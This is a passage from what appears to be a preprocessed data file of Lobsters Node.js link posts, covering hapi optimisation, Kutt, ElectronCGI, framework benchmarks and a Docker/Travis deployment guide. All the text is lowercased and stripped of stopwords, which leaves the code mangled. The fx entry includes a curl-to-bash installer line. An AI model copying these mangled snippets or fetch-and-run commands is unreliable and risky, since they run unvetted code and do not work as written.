versus complex slightly faster one tuning code also put higher maintenance burden performance change based version io performance etcsetting benchmarkswith mind let continue simple benchmark luck plenty exists web framework nodejs already benchmark usually bit synthetic since often test fast framework return simple static json object get request obviously web application many thing still give u idea fast core framework give u idea performance impact improvementsthe benchmark used one maintained fastify community suite quite nice provides simple tool compare popular framework well bare hello world implementation individual framework hapi available herewe get simple request per second score spinning locally using autocannon http benchmarking tool npm install g autocannon git clone git githubcomfastifybenchmarks cd benchmark autocannon onport node benchmarkshapijsthe last command spin benchmark hapi server listening port autocannon bombard http request path second done get score look similar reqbytes count sampled per request mb readwe use score baseline track improvementsinitial improvementsas mentioned like approach performance improvement iteratively possible easier see impact change test often possible test many thing hard know worked v tfor first pas performance review codebase look pattern know experience cause problem easy fix example dynamically setting property class instance change hidden class us optimisecalling method result native call underneath hood nodejs going j native back substantial overhead hot codedoing much static work function call example pattern see lot plugin system setup work request instead plugin addedusing many runtime closure hot function callmaking big dynamic object instead class instancesthis good time remember disclaimer many pattern look change based nodejs version always remember test improvement benchmark ask optimisation really neededwe also look overuse promise recurring theme u past review laterapplying pattern hapi codebase found interesting thing since interested optimising hot path focused attention requestresponse lifecycle code found easy win probably surprising deeply familiar nodejs core codebaseon every request hapi would parse http request path url object using new url api nodejs normally problem given background nodejs collaborator knew url object currently backed native code mean expensive j native roundtrip every request since lot realworld usecases need access subcomponents url object added lazy parsing url avoid roundtrip theme hapi also accessed remote port remote ip address http connection expose user using reqconnectionremoteport reqconnectionremoteaddress actually getters also result native roundtrip since lot usecases require wrapped property another getteradditionally hapi constructed decently sized stats object request dynamic object help construct object faster moved class method instead using getter access expensive property remoteaddress actually getter native code get remoteaddress thisremoteaddress thisremoteaddress thisconnectionremoteaddress return thisremoteaddress using methodless class added benefit able easily spot object heap snapshot grouped class nameto test assumption another benchmark run using autocannon improvement enabled reqbytes count sampled per request mb readas see impact quite significant little complexity added codebase decent tradeoff farcode generationthe second phase analysis aimed towards finding place source code dynamic code used dynamic code mean pattern used log http framework plugins etc extend capability apis provideda pattern often used plugin apis adding series function object constructor similar class thing constructor plugins const name fn plugins name fn since javascript pretty flexible language pattern improved quite bit little effort instead copying function array every instantiation given high number plugins mean significant cost hot code path utilise javascript prototype define onceclass thing static addplugins plugins class thingwithplugins extends const name fn plugins thingwithplugins name fn return thingwithplugins special case use eval function javascript take pattern code generation even another post open whole dimension pro con personally quite like pattern often lead faster code whilst opinion sacrificing readabilityfor hapi suggested pattern implemented prototype landed committhis patch made cost adding plugins basically zero instead adding overhead depending many plugins user would usefor specific program parser using code generation speed execution many magnitude pattern always good idea keep mind applied codebasepromises garbage collectionafter applying abovementioned fix measured significant performance boost next iteration however stumbled interesting problem turned bit headscratcher main simple benchmark server hapi look like serverroute handler async function request h return hello world introducing simple settimeout handler saw significant performance degradationsasync function request h wait responding await new promise resolve settimeout resolve return hello world running bench expect request per second performance le unchanged perhaps average request latency increase tiny bit due delay every requestinstead saw big drop performance around something offwe lot profiling try detect would big impact end enabling flag found strong signal could wrongthe garbage collection pause much longer version delay compared unchanged one additionally using bubbleprof tool clinicjs saw lot promise memory requestto get better understanding happening ran benchmark nodejs debug mode attached dev tool done actually quite easy super powerful way debug application run node appjs open google chrome dev tool see nodejs icon clicking dev tool session nodejs program heap snapshot benchmark delay since debugging memory usage garbage collection decided series heap snapshot benchmark could compare showed clear result version delay thousand promise clogging memory compared nondelayed onewith mind dug source code noticed request hot path many async function awaited know experience although easy use async function create significant amount memory pressure see hot path consider strong signal heap snapshot response delay notice ton promise profile nowluckily u hapi async rare case example hapi support userdefined encoders addition json etc support different use case function awaiting internally although vast majority user use synchronous encoding schemesasync function onrequest creates series promise even synchronous encoders resend await customencoder result carefully crafting synchronous fast path request lifecycle whenever async behaviour optional like use case saw significant performance increase delayed benchmark making comparable undelayed one removing gc pressurewe see performance fix reflected benchmark well autocannon profile async fix reqbytes count sampled per request mb readand one afterreqbytes count sampled per request mb reada decent increaseconclusionall able squeeze performance boost hapi using relatively simple changestry look simple performance pattern first ask really need make code faster almost always come readability cost give clinicjs try usually good predicting look info others using clinicjs improve performance check article clinicjs rise top diagnosing nodejs performance issuesalthough async function easy sprinkle everywhere performance cost significant hot path try limit code optionally async like encoding use case perhaps make fast path slow path plus side since async function relatively new implemented javascript virtual machine surely make faster le memory intensive future
58,Lobsters,nodejs,Node.js programming,Free libre URL shortener made with TypeScript to self-host and use with custom domain (MIT license),https://github.com/thedevs-network/kutt,free libre url shortener made typescript selfhost use custom domain mit license,kuttit kutt http kuttit migration migrationmd table content key feature stack setup manual nodejs postgresql redis download latest zip see docker see docker hub configuration defaultdomain db adminemails recaptcha mail comment reportemail browser extension kuttextension api docskuttit integration sharex sharex sharex wiki alfred workflow alfred alfredkutt party package kuttsharp kuttcli kuttrb urlshortener kuttrs nodekutt kuttvscode kuttdesktop kuttgo donate contributing thomas muthu muthu,kuttit kutt modern url shortener support custom domain shorten url manage link view click rate statistic contribution bug report welcome http kuttit migration new version kutt version used typescript moved postgresql database favor performance working adding new feature coming refer migrationmd migrate data postgresql table content key feature free open source custom domain support custom url shortened link set password link set description link expiration time link private statistic shortened url view edit delete manage link admin account view delete ban link ability disable registration anonymous link creation private use restful api stack node web server express web server framework passport authentication react ui library next universalserverside rendered react easy peasy state management styledcomponents cs styling solution library recharts chart library postgresql database redis cache layer setup manual need nodejs postgresql redis installed clone repository download latest zip copy exampleenv env fill properly see install dependency npm install run development npm run dev run production npm run build npm start docker download dockercomposeyml dockerenvfile repository configure dockerenv see execute kutt simply run dockercompose command app ready port dockercomposeyml us official kutt docker image available docker hub configuration minimal configuration following setting changed envfile defaultdomain domain kutt instance db db credential use dockercompose skip adminemails commaseparated list administratoraccounts recaptcha enter credential use recaptchas delete setting nt want use mail enter smtpserver credential experience show ssl work better starttls mail config required easily create account see comment done manually reportemail kutt offer form report malicious link sent mailaddress browser extension download kutt extension web browser via link also find source code kuttextension api visit api documentation docskuttit integration sharex use kutt default url shortener sharex host custom instance kutt refer sharex wiki setup alfred workflow download kutt official workflow alfred app alfredkutt repository party package language link description c net kuttsharp net package kuttit url shortener python kuttcli commandline client kutt written python ruby kuttrb kutt library written ruby rust urlshortener url shortener library written rust rust kuttrs command line tool written rust nodejs nodekutt nodejs client kuttit url shortener javascript kuttvscode visual studio code extention kutt java kuttdesktop cross platform java desktop application kutt go kuttgo go client kuttit url shortener donate kutt free charge free ad help u keep server running motivate u work project donating bitcoin wallet contributing pull request welcome probably find lot improvement made open issue feedback requesting feature reporting bug discussing idea special thanks thomas muthu logo design muthu
59,Lobsters,nodejs,Node.js programming,Ervy live demo is available – Bring charts to terminal,https://www.chunqiuyiyu.com/ervy/#demo,ervy live demo available bring chart terminal,installation usage demo example document,installation npm install ervy usage const ervy require ervy const bar pie bullet donut gauge scatter ervy const data key value key b value key c value consolelog bar data option demo example need detail check document
60,Lobsters,nodejs,Node.js programming,Spacedtime - Remember the important things in your life,https://www.spacedtime.com/,spacedtime remember important thing life,remember important thing life,remember important thing life using spaced time repetition technique permanently store information brain instead cloud start remembering yarn global add spacedtime spacedtime add anniversary spacedtime recall pull question remember
61,Lobsters,nodejs,Node.js programming,ElectronCGI 1.0 - Cross-platform GUIs for .Net Core,https://www.blinkingcaret.com/2020/03/25/electroncgi-1-0-cross-platform-guis-for-net-core/,electroncgi crossplatform gui net core,electroncgi electroncgidotnet electroncgi cross platform net core gui electron electroncgi solution crossplatform gui net core window store app mvvm version error propagation memory ace programming window apps c xaml making window store memory ace github twitter github,happy share version electroncgi know electroncgi twopart library allows invoking net code nodejs nodejs code net two part comprised npm package called electroncgi nuget package called electroncgidotnet electroncgi useful allows leverage tool like electron build ui desktop application still nonui code written using net electroncgi different existing alternative example electronnet electrongcgi rely http communication electroncgi net process launched maintained connection connection established using process stdin stdout stream provided o almost boilerplate required motivating force net core cross platform good story regarding gui outside window blog post focus change new feature version want indepth introduction electroncgi find two blog post electroncgi cross platform net core gui electron electroncgi solution crossplatform gui net core also end blog post brief description indepth latter blog post electroncgi allowed port window store app built using mvvm making cross platform nonui code reuse version biggest breaking change version introduces related callback signature version callback follow nodejs convention error object first argument result second argument previously connectionsend requesttype args response use response connectionsend requesttype args err response err handle err return use response alternatively omit callback send return promise write try const result await connectionsend requesttype args use result catch err handler err lead u second main improvement version electroncgi error propagation error propagation previous version exception handler net net process would crash error would written log file logging enabled version exception serialized sent nodejs process example handler net connectionon greet string name stringisnullorempty name throw new argumentexception name required name return hello name request performed nodejs connectionsend greet err re err err net exception consolelog errmessage name required using async await try const greeting await connectionsend greet catch err consolelog errmessage chance handle error importantly connection remain open memory ace memory ace application created window store around read charles petzold programming window apps c xaml book time excitement window store idea pushed apps audience billion user even developer claiming making window store guess time microsoft pumping ad money kick store missed wave never made pocket change memory ace first app created way found make familiar platform looking back would never even remotely popular game memorize full deck card yes right want least amount time sound like something lot fun agree probably mindful exercise practice although study know support probably improves memory anyway interesting thing memory ace follows recommendation charles petzold book us view model view model dependency anything platform specific ie opening file dialog etc able port view model linux using electroncgi recreate ui used react look gif captured ubuntu look memory ace github readme file instruction run give confidence call version electroncgi able comfortably develop port without issue even pleasant development experience go much detail step planning write another blog post summarize order use view model electroncgi case familiar concept viewmodel idea viewmodel encapsulates data model displayed view also behavior happen click button view example way materialized window store apps wpf viewmodels implement interface named inotifypropertychanged thing interface defines event named propertychanged idea property viewmodel change propertychanged event raised name property changed view listens event allows data binding happen change made viewmodel property view notified update action performed user view icommand interface button window app universal window platform wpf configured run instance icommand stored viewmodel executing command update property viewmodel turn lead view updated icommand defines two method canexecute object parameter return boolean indicates command executed execute object parameter actually executes command also defines event canexecutechanged view us known call canexecute example memory ace viewmodel vm named memorizationviewmodel one property list memorized card named cardsmemorized another property currentcard card displayed memorization area example command turncard turn card add cardsmemorized also set currentcard card turned use vm electroncgi need send request net nodejs property change look like currentcard memorizationpageviewmodelpropertychanged propertychangedeventargs switch propertychangedeventargspropertyname case currentcard connectionsend memorizationcurrentcard memorizationpageviewmodelcurrentcard break cardsmemorized observablecollection collection raise event element addedremoved memorizationpageviewmodelcardsseencollectionchanged e args connectionsend memorizationcardsseen memorizationpageviewmodelcardsseen side connection case react app running inside electron need handle event update ui simplified version look like using react function component usestate hook const currentcard setcurrentcard usestate const cardsseen setcardsseen usestate connectionon memorizationcurrentcard err newcurrentcard handle error exists setcurrentcard newcurrentcard connectionon memorizationcardsseen err cardsseen handle error exists setcardsseen cardsseen command action triggered ui concrete example click handler react application running electron async function turncard try await connectionsend memorizationturncard catch err handle error net connectionon memorizationturncard memorizationpageviewmodelturncardcommandcanexecute null memorizationpageviewmodelturncardcommandexecute null basically complication course namely deploy thing get shuffled around use packager like electronpackager app also thing related electron like example expose connection render process react app running planning write blog post detailing future meanwhile follow twitter tweet new post ready also star project github try add issue question find something broken related
62,Lobsters,nodejs,Node.js programming,"Refresh front and backend changes to browser with Express, LiveReload and Nodemon",https://bytearcher.com/articles/refresh-changes-browser-express-livereload-nodemon/,refresh front backend change browser express livereload nodemon,reserve changed cs html image asset livereload server livereload client snippet restart backend request browser reload page restart backend request browser reload page,want see change affect page browser step away hit save refresh page couple time start looking better way heard livereload tangle unintelligible gulp file besides tutorial teach get backend change reload well true livereload way go way set refreshes front backend change changed frontend file reserved without restarting express freshen backend file restart server using nodemon signal browser reload page without gulp grunt video step make expressgenerator project refresh front backend change browser reserve changed cs html image asset backend code create express server typically life port make change refresh browser addition start another server live high port responsibility watch file harddisk notify change also monkey patch every served html page aware high port service provides livereload server make livereload server happen install npm package appjs wherever start express server start livereload server point watch statically served directory const livereload require livereload var livereloadserver livereloadcreateserver livereloadserverwatch pathjoin dirname public livereload client snippet server counterpart running life high port ready tell file change still need web page aware high port service provides inject script element every served html page snippet connect high port refresh changed resource luckily nt program instead use connectlivereload package provides express middleware injects script element npm install connectlivereload configure express app use middleware fairly high middleware chain effect rendering view template var connectlivereload require connectlivereload var app express appuse connectlivereload frontend file automatically refreshed browser restart backend request browser reload page refresh backend file restart server signal browser reload page module system require cache source file future use clean way restarting force rereading changed route handler example use nodemon watching restarting server restart backend create dedicated watch script start nodemon ignore public directory already handled livereload server nt want watch file script start node binwww watch nodemon ignore public request browser reload page one final step signal browser reload page server gotten tricky since nodemon kill previous server also high port get disconnected browser side reconnect soon enough tap connection event wait another livereload protocol finish handshake request browser refresh whole page issuing refresh using livereload api avoid infinite refresh loop livereloadserverserveronce connection settimeout livereloadserverrefresh also change backend file refreshed browser use watch script
63,Lobsters,nodejs,Node.js programming,ExpressJS vs Actix-Web: performance and running cost comparison,https://medium.com/@maxsparr0w/performance-of-node-js-compared-to-actix-web-37f20810fb1a,expressjs v actixweb performance running cost comparison,expressjs v actixweb exactly think summary actix expressjs nodejs chrome javascript engine research actix techempower round report http githubcomdunnockactixnodebenchmark test scenario setup worker task task relation worker express knex actixweb asyncpg example deadpoolpostgres tokiopgmapper load test wrk config structopt resource monitoring quite easy automate fetch top task connection pool search fetch task description nodepostgres tokiopostgres,expressjs v actixweb exactly thinkthe goal analysis try understand kind gain programmer expect using rust actixweb rather node express typical use without custom optimizationssummarycompare performance stability running cost simple microservicelike workload nodeexpressjs v actix setup limited cpu core using common pattern development eachactix provides running cost saving heavily loaded environment also providing smaller memory footprint runtime safety warranty also option scale cpu minimum memory expense unveils saving opportunitiesrust type concurrent logic validation saved time providing reliable working code compiled node solution required time debug fix issue runtime well explicit type validationexpressjs fast minimalist popular nodejs web framework nodejs javascript runtime built chrome javascript engine among top popular application server used high traffic site according research share growingactix small pragmatic extremely fast web framework rust according techempower round report fastest web application platform categoriescode available http githubcomdunnockactixnodebenchmarkdisclaimer provided research focusing purely quality aspect cost running apps taken advice rewrite javascript rust account cost rewritetest scenario setuppresume microservice allows client search task task might assigned worker simple database model two table worker task task assignee relation worker let compare application server behave check resource consumption moderate high load let assume database bottleneck leave different post nodejs app built express web framework knex sql builder library widely popular knex claim use prepared sql statement hood embedded pool comparable rust setup main handler actixweb service based asyncpg example us deadpoolpostgres async connection pool tokiopgmapper sql type binding main route handler look similar express one except type check parameter performed based type definition load testtesting performed ubuntu xeon core database initialized randomly generated task assigned workersusing wrk going load server similar request number concurrent connection predefined request suit case well server using cache searchwe need run multiple test measurement cpu memory latency rps automation would pay rust rich toolbox writing cli automation including config structopt resource monitoring quite easy automate test follow executed via cargo run bin benchit release fetch top taskssearch return first record without fat description field row data light sql server provide maximum request per second test performed following command line hood wrk c concurrency http host port task comparison actixweb nodejs limit actix core eg worker initially execute web processing code deadpool configured connection handle database communication cargo run release bin actixbenchnodejs executes javascript single thread us multiple thread running asynchronous communication configure knex use connection pool match deadpool configuration cd nodebench npm run startlooking concurrency rps even small load actix provides least time faster response node heavy load faster look database utilization actix seems performing time efficient look response time nodejs concurrency provides similar delay actix concurrency time better memory footprint point view even better long run million request memory actix service around nodejs grew hello gc conclusion loaded system need time le cpu core actix nodejs cost savingactix super efficient using multiple cpu core fixed set worker thread worker minimizes context switch default actix start many worker thread cpu coreslet see well actix scale cpu worker compare worker actix setup cargo run release bin actixbenchwith worker actix provides time better response time actix worker heavy load also providing time response per second actix scale well cpu keeping memory consumption almost level nevertheless number cpu occupied node also scale cpu running new process per cpu would duplicate memory usage every new instanceactix fully utilize cheap core cloud instance node would require expensive instance search fetch task descriptionthis search return match indexed varchar summary like also fetching text description field definitely put pressure sql serverwrk c concurrency http host port task summarywherever fulltrue heavy db hence run connection poolquite surprise nodejs loading sql server level similar actix giving time worse performance probably something knexjs way handle prepared statement though goal post compare typical use lead final summaryactixweb rust ecosystem good fit developing efficient web service requiring time le cpu power le memory would allow significant runtime cost saving basic optimized setupthe goal post compare typical use account deep fine tuning like node gc setting using low level sql library opportunity optimize nodejs solution probably minimize gap though require significant effort engineer side effort might applied optimizing rust solution though next post going use nodepostgres tokiopostgres directly see node code get closer actixweb
64,Lobsters,nodejs,Node.js programming,"Setting up a custom CI/CD pipeline for a personal project (Node.js, Docker, Travis)",https://www.taniarascia.com/continuous-integration-pipeline-docker/,setting custom cicd pipeline personal project nodejs docker travis,cicd prerequisite goal code pushed branch pull request travis ci code pushed branch cicd cicd continous integrationcontinuous deployment continous integration continuous integration continous deploymentdelivery continuous deployment continuous delivery getting started takenote jamstack netlify nodejs express react full stack authentication joe goal docker docker installation instruction docker desktop docker hub github npmjs registry image container image image container container tag cli reference dockerfile copy workdir run expose entrypoint building tagging running container build build run run tag publish next step travis ci digitalocean circleci github action aws linode travis ci travis ci website lifecycle lifecycle testing quick tutorial deployment doctl follow simple guide thing note tlsssl load balancing massive amount setup conclusion feel free let know,built first website late pretty simple get running single shared server running apache could ftp typing ftp ftpexamplecom url bar entering username password moving file host different time simpler time thing changed quite bit past two decade website became complex required build step going production one server became many server running behind load balancer version control git became commonplace personal project custom setup knew wanted ability deploy website production single action merging code master branch github also knew nt want orchestrate huge kubernetes cluster docker swarm server fleet pod agent sort complication small web application order get familiar cicd small project case nodejs project would like get idea automate deployment git date production article might interest prerequisite goal quite tutorial documentation learned process decided upon test deploy code production single automated step process ended looking like code pushed branch pull request kick build travis ci run unit integration endtoend test code pushed master branch plus build docker image based current code setting environment deploy image docker hub connect production server pull image docker hub stop current container start container based new image nothing docker image container make sense yet nt worry covered article cicd cicd stand continous integrationcontinuous deployment continous integration continuous integration process wherein developer frequently commit main source usually master branch ensure quality control automated test continous deploymentdelivery continuous deployment process deploying code frequently automated process also see continuous delivery similar requires manual approval deployment process run getting started application used learning process takenote webbased notetaking app working initially tried make jamstack app frontend without server order take advantage builtin hosting deployment netlify offer app grew complexity needed bring server therefore would figure automated integration deployment strategy case app nodejs express server serf react single page application front end secure apis back end follows strategy found full stack authentication tutorial consulted friend automated expert joe get working like wanted gave idea flow laid goal article meant going figure use docker docker docker tool allows easily share deploy run application consistently many environment container first needed get access docker command line cli installation instruction docker clear straightforward need download docker desktop mac window additionally docker hub similar github git repository npmjs registry javascript package online repository docker image login docker desktop connect complete ensure docker cli set working checking version log docker hub prompt username password order use docker must understand concept image container image image blueprint contains instruction build container immutable snapshot file system configuration application image easily shared developer repository tag image id created size container container executable package contains everything needed run application always run regardless infrastructure sandboxed environment running instance image container id image command created status port name tag reference specific image version cli reference overview commonly used command dockerfile know run app locally production webpack configuration build production react application command start node server port look like nt sample application article simple node application easy set following instruction use container need give instruction docker via file called dockerfile root project dockerfile seems little intimidating first much different set local environment requires dockerfile specific command start dockerfile pull base image copy copy file local source container target workdir set working directory subsequent command run run command expose set port entrypoint set executable command looked little something like dockerfile copy app workdir app run npm ci onlyproduction run npm run build expose entrypoint npm run start depending base image choose might need install additional dependency certain base image node alpine linux meant small possible nt extensive array global program installed building tagging running container building running container locally pretty simple attempting deploy docker hub use automation want see work locally build first build image name optionally tag tag specified tagged latest docker build image tag see start running step sending build context docker daemon step running step successfully built successfully tagged image tag might take minute two depending many dependency complete docker image see new image repository tag image id created size image latest minute ago xxxgb run image created run container based since want view set left side port right side point container pointing docker run p image tag container created running docker p see docker p see container currently running container id image command created status port name image binsh c npm second ago second stoicdarwin going display fully built application appear production tag publish use one image production server want able retrieve docker hub create repository project docker hub place send image update image name docker hub username repository plus whatever tag want build tag like new name docker push docker hub repository docker build username repository tag docker tag username repository tag username repository latest docker push username repository tag docker build userapp docker tag userapp userapp latest docker push userapp went well image live docker hub easy share next step point see application running docker container locally image docker hub big portion battle two issue cover setting continuous integration tool test deploy code setting production server receive serve code case used travis ci cicd digitalocean server alternative automation tool server example instead travis could use circleci github action instead digitalocean could use aws linode since went travis already testing setup briefly go entail set travis flow travis ci travis ci tool testing shipping code nt want go much specific setting travis every use case unique cover basic case decide use concept configuration simple whether dealing travis circleci jenkins whatever use travis ci go website create account integrate github account find github repository planning adding automation enable using github sure integrates bitbucket gitlab whatever else every time start build connected travis spin server run command specified including deployment specific branch lifecycle travis configuration file live travisyml root project concept lifecycle earliest latest lifecycle look like apt addons cache component beforeinstall install beforescript script beforecache aftersuccess afterfailure beforedeploy deploy afterdeploy afterscript testing travis configuration file going set local travis server chosen language node version instructed install necessary dependency use docker everything travis file run pull request branch github repository unless otherwise specified useful mean run test incoming code see ready merge master wo nt break build global configuration install everything locally run webpack dev server background specific flow run test want code coverage badge repository quick tutorial explains use jest travis coverall collect display coverage travisyml language nodejs nodejs service docker install npm ci beforescript npm run dev script npm run test signifies end lifecycle branch pull request deployment assuming automated test passed optional ability deploy code production server since want master specify deploy config try inlining code like rest step warn actual script call deployment deploy provider script script bash deploysh branch master deployment script consist two aspect building tagging pushing docker image ci tool travis pulling stopping starting docker container server digitalocean case first set building tagging pushing step similar way manually except need unique tagging strategy automated logging struggled figuring aspect deployment script tagging strategy logging using input encoding ssh key dealing ssh inception first part script getting image docker hub straightforward tag naming used combine git hash git tag exists ensures unique tag make easy identify build based dockerusername dockerpassword custom environment variable set travis ui travis redact sensitive data showing deploy feed deploysh binsh set e image username repository gitversion git describe always abbrev tag long docker build image gitversion docker tag image gitversion image latest echo dockerpassword docker login u dockerusername passwordstdin docker push image gitversion second part script depends entirely host using strategy connecting since using digitalocean meant using doctl cli command aws would aws nt much initial setup server set droplet based base image system require installing starting docker manually however used ubuntu follow simple guide getting step ready using ubuntu well wo nt supply individual command service vary wildly ssh deployment server resemble docker stop currentcontainer docker rm currentcontainer docker run namecurrentcontainer restart unlessstopped p image gitversion docker system prune f thing note might get warning connecting ssh host travis prevent installation continuing since expects input authenticity host hostname ip address ca nt established rsa key fingerprint key fingerprint sure want continue connecting yesno learned vanya encode string store predictable format install phase decode public key write knownhosts file bypass error echo public key practice input would look something like echo sshrsa examplecom encoded output install echo base encoded public key homesshknownhosts tactic used private key connection phase likely need private key access server want make sure private key securely stored travis environment variable absolutely visible deployment feed another thing note might run whole deployment script single line like doctl require finetuning doctl compute ssh droplet sshcommand command go tlsssl load balancing finished final issue server ssl since running node server massive amount setup get nginx reverseproxy let encrypt running really interested manual ssl setup simply created load balancer pointed dns load balancer digitalocean example creating autorenewing selfsigned certificate load balancer simple free instant added benefit allowing easily ssl set multiple server running behind load balancer choose also allows server concept ssl still run everything port certainly much easier alternative added benefit set close inbound access port server except port load balancer ssh trying hit server directly mean except two rejected conclusion setting longer intimidated docker concept automation pipeline cicd managed set full continuous pipeline test code integrating production automatically deploys code server still relatively new sure way make process better efficient improvement critique feel free let know update article accordingly hope article help learn much
65,Lobsters,nodejs,Node.js programming,Fix 18.0.0 release with new mapping syntax,https://github.com/antonmedv/fx,fix release new mapping syntax,feature install release usage interactive mode fxrc documentation documentation link related license mit,function execution commandline json processing tool feature easy use standalone binary interactive mode streaming support install via homebrew download standalone binary release bash curl l http fxwtf usage start interactive mode without passing argument passing filename first argument pas json file cat foojson barjson bazjson fx message use full power javascript curl fx filter x xstartswith access lodash ramda etc method using fxrc file curl fx groupby commitcommittername mapvalues size update json using spread operator echo count fx count count print formatted json stdout pipe json log stream fx kubectl log f fx message try documentation see full documentation link related license mit
66,Lobsters,nodejs,Node.js programming,Webserver Benchmark: Erlang vs Go vs Java vs NodeJS,https://stressgrid.com/blog/webserver_benchmark/,webserver benchmark erlang v go v java v nodejs,cowboy mochiweb fasthttp netty rapidoid methodology stressgrid dummy web application previous test result conclusion article discussion lobster discussion hacker news,article compare performance webservers commonly used implement serverside application opposed webservers used serve static content proxy look webservers implemented erlang go java openjdk javascript nodejs test following webservers cowboy erlang otp cowboy erlang otp mochiweb erlang otp go nethttp fasthttp go nodejs clustered nodejs netty openjdk rapidoid openjdk methodology simulate generic web application behavior devised following synthetic workload client device open connection sends request millisecond one server handle request sleeping millisecond simulate interaction backend database return kb payload without additional delay result average connection lifetime second perdevice load averaging request per second connection per second workload expressed combination following stressgrid script dummy web application created web server enumeach fn get delay end test mediumsized instance vcpus gib ram test structured continuous ramp device chose number based packetpersecond limit exhibited previous test following calculation account network packet generated http request response transaction establishing closing http connection transsec packetstrans connsec packetsconn packetssec placing target number simulated device hardware limit want show software imposed limit compare use ubuntu kernel following sysctld override fsfilemax netcoresomaxconn workload using nonencrypted http produced stressgrid generator placed vpc target host result test notable exception nonclustered nodejs limiting factor cpu fully saturated essence test shown webservers scaling available cpu varying degree efficiency let look responsepersecond graph go fasthttp came top peaking nearly response per second javabased netty distant second almost go builtin webserver peaked slightly nodejs cluster erlangbased cowboy range another erlangbased webserver mochiweb cowboy javabased rapidoid finally nonclustered nodejs scored clustered nodejs rapidoid crashed running ram overloaded server overloaded maintained peak performance except mochiweb let look percentile response latency graph graph much easier see different webservers respond overload notably erlangbased server overloaded maintained stable response latency cowboy keeping around millisecond go java server getting progressively slower nonclustered nodejs limited utilizing one cpu slowest result clustered nodejs rapidioid inconclusive since ran available ram stressgrid get function default timeout second mean response latency graph includes response received second let look rate timeouts complete picture happening webservers overloaded notably java netty absent graph mean netty maintains mostly equal latency request overloaded erlang server different approach serve fraction request quickly possible let rest time interestingly behavior improves time fewer fewer timeouts observe similar behavior nonclustered nodejs go server overloaded start timing well since happens end test conclude behavior change time conclusion test shown modern webservers scale well able utilize cpu multicpu machine performance limited efficiency webserver implementation corresponding language runtime virtual machine go javabased webservers shown efficient clustered nodejs reasonably efficient run ram overloaded erlang webservers least efficient however stable overloaded surprisingly cowboy performed significantly better cowboy reason included test explore analyze anomaly dedicated article packetpersecond limit imposed become issue used efficient webservers like fasthttp test modeled backend database interaction variable sleep delay reality interaction consume additional packetpersecond budget proportionally workload since frontend traffic already consumes budget addition one database interaction every frontend request result oversaturation discussion lobster discussion hacker news
67,Lobsters,nodejs,Node.js programming,Node.JS Use Case: When & How Node.JS Should be Used | Simform,https://www.simform.com/nodejs-use-case/,nodejs use case nodejs used simform,data streaming serverside proxy building large scale website nodejs building web apps nodejs advantage disadvantage big data analytics dealing large data browser troublesome nodejs back pressuring make data processing easier wireless connectivity nodejs server ensures data connectivity without request blockage system monitoring dashboard realtime data sharing reusing io bound fast scalable queued input app database crashed huge data load asynchronous nature nodejs make capable handling huge data load chatbots business investment customer service call costly,nodejs usage best use case nodejs categorizedwe analyzed industry use nodejs tech stack classified different category loyalty matrix attached result analysis often nodejs get used category wise retention percentage categoriesquadrant includes category frequently used industry leveraging time surprisingly data streaming chatbots realtime data fall within quadrant industry use nodejs category every day many time day quadrant ii consists category used intensely finite period time web scraping fall within quadrant ii along serverside proxy system monitoring dashboard although category used industry intensive manner retention period time le falling quadrant quadrant iii made category low retention infrequent use however use nodejs category expected increase upcoming year needle say bigdata iot technology fall quadrant quadrant iv comprises category low frequency use loyal industry base category like rest api queued io input commandline apps fall category let cover category data streamingthe problemstreaming data web require heavy processingdata streaming complex process requires continuous stream data generated array different source device delivered wide myriad format solutionnodejs stream make datastreaming easier ever traditional medium streaming http request response treated like isolated event however reality stream nodejs used build cool data streaming feature file still processed uploaded possible data come stream processed online without interrupted instance realtime audio video encoding possible particularly javascript library node medium entertainment industry nodejs utilized data serverside proxythe problemthirdparty proxy cause trouble building complex webappsthirdparty proxy service nginx haproxy sometimes feasible scalable handling multiple request various source timethe solutionnodejs make easier build proxy serverwhile thirdparty proxy service nginx haproxy affordable add severe complexity used building large scale website nodejs easily employed serverside proxy collecting data various thirdparty resource whether building news website bbc medium website forbes entertainment website imdb would want load content various thirdparty domain nodejs beneficial proxying different service different response time used serverside proxy capable handling large number simultaneous connection nonblocking manner instance consider website bbc news communicating various thirdparty resource gathering data different source storing asset like image video thirdparty cloud servicesalso read nodejs building web apps nodejs advantage disadvantage big data analyticsthe problemdealing large data browser troublesomeif trying deal larger data browser might wait user long time user like wait minute frozen browser matter cool analysis might solutionnodejs back pressuring make data processing easiernodejs stream allow effectively pipeline data start one point flow end overcome problem dealing larger data important mechanism breaking large data multiple chunk using back pressuring come implementing nodejs use computer resource processing large set data wireless connectivitythe problembandwidth consumption bidirectional signalingbandwidth consumption major challenge iot connectivity collecting routing data device reliable bidirectional signaling essential challenge requires reliable server collect data send particular destinationsolutionnodejs server ensures data connectivity without request blockagenodejs best solution create proxy server data connectivity routing support io connectivity without blockingsome javascript library nodejs nodered nodemcu node serialport offer readymade solution connecting iot system monitoring dashboardthe problempushing realtime data scale inconvenientdashboards meant convey large amount information quickly however finding relevant information displaying realtime difficult using dashboard respond error high chance encounter several problem like automatically notified unusual behavioryou need monitor dashboard detect potential error continuouslythe solutionpushing data realtime nodejs easyusing advance capability event loop nodejs build powerful webbased dashboard validates status service asynchronous manner data pushed realtime client using websockets using nodejs internal intracompany public service status reported live instance build dashboard monitor realtime data run framework backed nodejs websocket instead java java applet realtime datathe problemscalability bottleneck realtime data common common realtime data streaming issue sizing scaling web app running live x need plan extra resource execute operation without failing meet servicelevel agreement solutionnodejs make realtime data boon web appsnodejs good fit building realtime web apps using push technology web socket twoway communication server client revolutionary nodejs best choice creating serverside web apps let walk reason pivotal choose nodejs building realtime web apps sharing reusing let developer share package library codeio bound nodejs handle io bound task effectively fast scalable realtime web apps possible handle multiusers request due singlethreaded model nodejsthe collaborative web apps trello google doc live chat instant messaging online gaming example realtime apps benefit nodejs architecture apps function within time frame user recognize immediate current queued inputsthe probleman app database crashed huge data loadreceiving high amount concurrent data make database congested resulting crash application also becomes expensive queue data maintain concurrency huge data load solutionthe asynchronous nature nodejs make capable handling huge data loaddue asynchronous capability eventdriven architecture nodejs excels handling huge data load data queued caching messaging queuing infrastructure rabbitmq zeromq stored different database batchwrite chatbotsthe problemfor business investment customer service call costlya typical business spends trillion billion customer service call year moreover billion customer support request made every year cost business whopping trillion service huge cost considering revenue made business constant solutionchatbots offer better customer service experience lower costbuilding chatbots nodejs perfect solution build simple api quickly hapijs express etc support realtime message rtm slack rtm bot facebook built sample chatbot nodejs available github drift conversiondriven marketing sale platform another example chatbot connects business best lead drift let user directly message within browser provide automated chat experience
